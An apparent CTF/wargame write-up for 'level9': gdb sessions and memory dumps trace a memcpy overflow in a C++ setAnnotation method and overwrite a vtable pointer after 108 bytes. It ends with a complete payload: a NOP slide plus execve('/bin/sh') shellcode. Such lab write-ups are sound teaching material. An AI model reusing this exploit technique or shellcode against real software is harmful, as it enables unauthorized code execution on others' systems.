There is an memcpy with argv[1]
If we pass too much character is segfault

disas _ZN1N13setAnnotationEPc
b*0x08048733 ( memcpy )
(gdb) run $(python -c 'print "A" * 60')

(gdb) b*_ZN1N13setAnnotationEPc
(gdb) x/10wx $esp
0xbffff64c:	0x0804867c	0x0804a008	0xbffff85f	0xbffff720
First addr = object himself
second = destination
three = our 'A'

(gdb) b*0x08048733 (memcpy)
(gdb) c
(gdb) x/x $edx 
0x804a00c:	0x00000000

Which is our destination for memcpy, let's explore this

(gdb) x/30x 0x804a00c
0x804a00c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a01c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a02c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a03c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a04c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a05c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a06c:	0x00000000	0x00000005	0x00000071	0x08048848
0x804a07c:	0x00000000	0x00000000

We can see that if we overwrite 108 bytes the next 4 bytes will overwrite the
VPTR table '0x08048848'

We will redirect this to a shellcode instead of his current ptr func.

Let's see what the current addr of the stack when we call edx with a normal
execution
(gdb) b*0x08048693 (call edx)
(gdb) run $(python -c 'print "A" * 108')
(gdb) p $esp
$7 = (void *) 0xbffff650
(gdb) x/20wx 0xbffff650
0xbffff650:	0x0804a078

Great we can use `0x0804a078` to store our shellcode

Final payload, i've added an nop slide because sometime the stack mess up

./level9 $(python -c 'print "A" * 108 +"\x78\xa0\x04\x08" + "\x90" * 100+"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
